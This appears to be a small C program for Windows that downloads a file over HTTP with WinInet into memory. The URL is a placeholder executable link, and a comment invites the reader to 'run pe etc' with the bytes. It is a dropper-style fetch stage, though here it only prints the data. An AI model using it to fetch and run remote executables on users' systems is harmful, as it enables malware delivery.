#include <stdio.h>

#include <Windows.h>
#include <WinInet.h>
#define CHUNKSIZE 1024
HANDLE getfile(LPCSTR url, PBYTE *ppBuf, PDWORD pdwSize)
{
	DWORD dwAllocated = CHUNKSIZE * 5, dwRead = 0, dwTotalRead = 0;
	BOOL bDownloaded = FALSE;
	HANDLE hHeap = HeapCreate(0, 0, 0);
	if (hHeap == NULL) {
		return 0;
	}
	*ppBuf = (PBYTE)HeapAlloc(hHeap, 0, dwAllocated);
	PBYTE pTmp = NULL;
	LPCSTR szHeaders = "Accept: */*\r\n\r\n";
	HINTERNET hInternet = InternetOpenA(USERAGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet)
	{
		HINTERNET hFile = InternetOpenUrlA(hInternet, url, szHeaders, strlen(szHeaders), INTERNET_FLAG_RELOAD, 0);
		if (hFile)
		{
			do {
				bDownloaded = InternetReadFile(hFile, (LPVOID)(*ppBuf + dwTotalRead), CHUNKSIZE, &dwRead);
				dwTotalRead += dwRead;
				if (dwTotalRead + CHUNKSIZE > dwAllocated)
				{
					dwAllocated += CHUNKSIZE * 10;
					pTmp = HeapReAlloc(hHeap, 0, *ppBuf, dwAllocated);
					if (pTmp)
					{
						*ppBuf = pTmp;
					}
					else
					{
						HeapFree(hHeap, 0, *ppBuf);
						InternetCloseHandle(hFile);
						InternetCloseHandle(hInternet);
						*pdwSize = 0;
						*ppBuf = NULL;
						return NULL;
					}
				}
			} while (bDownloaded && dwRead);
			InternetCloseHandle(hFile);
		}
		InternetCloseHandle(hInternet);
	}
	*ppBuf = HeapReAlloc(hHeap, 0, *ppBuf, dwTotalRead);
	//memory leak 2017, thanks.. error checking is for low lifes ;)
	*pdwSize = dwTotalRead;
	return hHeap;
}



int main(int argc, char **argv) {
    PBYTE pBuf;
    DWORD dwSize;
    HANDLE hHeap = getfile("https://linktoshittyexe.exe", &pBuf, &dwSize);
    if (hHeap)
    {
        for (DWORD i = 0; i < dwSize; ++i)
        {
// do what you want... run pe etc
putc(pBuf[i], stdout);

}
        HeapFree(hHeap, 0, pBuf);
    }
    else
    {
        MessageBox(0, "Could not download URL\n", "ERROR!", 0);
    }
    return 0;
}
